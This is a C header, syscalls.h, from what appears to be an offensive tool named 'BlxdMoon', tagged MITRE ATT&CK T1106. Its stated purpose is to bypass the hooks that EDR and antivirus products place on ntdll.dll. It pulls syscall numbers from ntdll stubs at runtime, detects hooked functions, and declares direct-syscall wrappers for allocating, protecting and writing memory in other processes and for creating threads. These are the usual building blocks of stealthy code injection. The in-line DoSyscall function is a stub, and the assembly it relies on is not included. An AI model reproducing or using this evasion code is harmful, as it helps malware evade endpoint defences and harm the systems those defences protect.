/**
 * syscalls.h - Direct Syscall Support for BlxdMoon
 *
 * MITRE ATT&CK: T1106 - Native API
 *
 * Purpose: Execute syscalls directly to bypass user-mode hooks placed
 * by EDRs/AVs on ntdll.dll functions.
 *
 * Note: Syscall numbers vary by Windows version. We extract them
 * dynamically from ntdll.dll at runtime.
 */

#ifndef SYSCALLS_H
#define SYSCALLS_H

#include <windows.h>

// ============================================================
// Syscall Table Structure
// ============================================================

typedef struct _SYSCALL_TABLE {
    DWORD NtAllocateVirtualMemory;
    DWORD NtProtectVirtualMemory;
    DWORD NtWriteVirtualMemory;
    DWORD NtReadVirtualMemory;
    DWORD NtCreateThreadEx;
    DWORD NtOpenProcess;
    DWORD NtClose;
    DWORD NtQueryInformationProcess;
    DWORD NtQuerySystemInformation;
} SYSCALL_TABLE;

// Global syscall table - initialized at runtime
extern SYSCALL_TABLE g_SyscallTable;

// ============================================================
// Syscall Number Extraction
// ============================================================

/**
 * Extract syscall number from an ntdll function
 *
 * x64 syscall stub pattern:
 *   4C 8B D1        mov r10, rcx
 *   B8 XX XX 00 00  mov eax, <syscall_number>
 *   0F 05           syscall
 *   C3              ret
 *
 * @param pFunction - Pointer to ntdll function
 * @return Syscall number, or 0 on failure
 */
static inline DWORD GetSyscallNumber(FARPROC pFunction) {
    if (!pFunction) return 0;

    BYTE *pCode = (BYTE*)pFunction;

    // Pattern 1: Standard syscall stub
    // 4C 8B D1 = mov r10, rcx
    // B8 XX XX 00 00 = mov eax, syscall_number
    if (pCode[0] == 0x4C && pCode[1] == 0x8B && pCode[2] == 0xD1 &&
        pCode[3] == 0xB8) {
        return *(DWORD*)(pCode + 4);
    }

    // Pattern 2: Some hooked scenarios where syscall is further
    // Try to find B8 within first 32 bytes
    for (int i = 0; i < 32; i++) {
        if (pCode[i] == 0xB8 &&
            pCode[i + 3] == 0x00 &&
            pCode[i + 4] == 0x00) {
            // Check if followed by syscall (0F 05) within next 10 bytes
            for (int j = i + 5; j < i + 15 && j < 40; j++) {
                if (pCode[j] == 0x0F && pCode[j + 1] == 0x05) {
                    return *(DWORD*)(pCode + i + 1);
                }
            }
        }
    }

    return 0;  // Unknown pattern or hooked
}

/**
 * Check if a function appears to be hooked
 * Hooked functions typically start with a JMP instruction
 *
 * @param pFunction - Pointer to function
 * @return TRUE if likely hooked
 */
static inline BOOL IsFunctionHooked(FARPROC pFunction) {
    if (!pFunction) return TRUE;

    BYTE *pCode = (BYTE*)pFunction;

    // Check for common hook patterns

    // JMP rel32 (E9 XX XX XX XX)
    if (pCode[0] == 0xE9) return TRUE;

    // JMP [rip+offset] (FF 25 XX XX XX XX)
    if (pCode[0] == 0xFF && pCode[1] == 0x25) return TRUE;

    // MOV RAX, addr; JMP RAX (48 B8 XX... FF E0)
    if (pCode[0] == 0x48 && pCode[1] == 0xB8) return TRUE;

    // Normal syscall stub should start with: 4C 8B D1 B8
    if (pCode[0] != 0x4C || pCode[1] != 0x8B || pCode[2] != 0xD1) {
        return TRUE;  // Doesn't match expected pattern
    }

    return FALSE;
}

/**
 * Initialize the syscall table by reading from ntdll.dll
 *
 * @return TRUE on success
 */
static inline BOOL InitSyscallTable(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    g_SyscallTable.NtAllocateVirtualMemory = GetSyscallNumber(
        GetProcAddress(hNtdll, "NtAllocateVirtualMemory"));

    g_SyscallTable.NtProtectVirtualMemory = GetSyscallNumber(
        GetProcAddress(hNtdll, "NtProtectVirtualMemory"));

    g_SyscallTable.NtWriteVirtualMemory = GetSyscallNumber(
        GetProcAddress(hNtdll, "NtWriteVirtualMemory"));

    g_SyscallTable.NtReadVirtualMemory = GetSyscallNumber(
        GetProcAddress(hNtdll, "NtReadVirtualMemory"));

    g_SyscallTable.NtCreateThreadEx = GetSyscallNumber(
        GetProcAddress(hNtdll, "NtCreateThreadEx"));

    g_SyscallTable.NtOpenProcess = GetSyscallNumber(
        GetProcAddress(hNtdll, "NtOpenProcess"));

    g_SyscallTable.NtClose = GetSyscallNumber(
        GetProcAddress(hNtdll, "NtClose"));

    g_SyscallTable.NtQueryInformationProcess = GetSyscallNumber(
        GetProcAddress(hNtdll, "NtQueryInformationProcess"));

    g_SyscallTable.NtQuerySystemInformation = GetSyscallNumber(
        GetProcAddress(hNtdll, "NtQuerySystemInformation"));

    // Verify we got at least some syscall numbers
    return (g_SyscallTable.NtAllocateVirtualMemory != 0 &&
            g_SyscallTable.NtProtectVirtualMemory != 0);
}

// ============================================================
// Syscall Execution (Inline Assembly - x64 only)
// ============================================================

#ifdef _WIN64

/**
 * Execute a direct syscall with up to 4 arguments
 *
 * For syscalls with more than 4 arguments, you need external
 * assembly to properly set up the stack.
 */
static inline NTSTATUS DoSyscall(DWORD syscallNumber,
                                  ULONG_PTR arg1,
                                  ULONG_PTR arg2,
                                  ULONG_PTR arg3,
                                  ULONG_PTR arg4) {
    // Note: For proper implementation, use external MASM file
    // This is a simplified version that works for 4-arg syscalls

    // The actual syscall requires:
    // - r10 = rcx (first argument)
    // - eax = syscall number
    // - Arguments in rcx, rdx, r8, r9

    // This cannot be done with inline assembly in MSVC x64
    // Use the assembly stubs in syscalls.asm instead

    return STATUS_NOT_IMPLEMENTED;
}

#endif // _WIN64

// ============================================================
// Syscall Stub Declarations (implemented in syscalls.asm)
// ============================================================

// These functions are implemented in assembly for proper syscall execution
// Link with syscalls.obj compiled from syscalls.asm

#ifdef __cplusplus
extern "C" {
#endif

// Direct syscall implementations (from syscalls.asm)
NTSTATUS SysNtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

NTSTATUS SysNtProtectVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

NTSTATUS SysNtWriteVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

NTSTATUS SysNtClose(
    HANDLE Handle
);

#ifdef __cplusplus
}
#endif

#endif // SYSCALLS_H
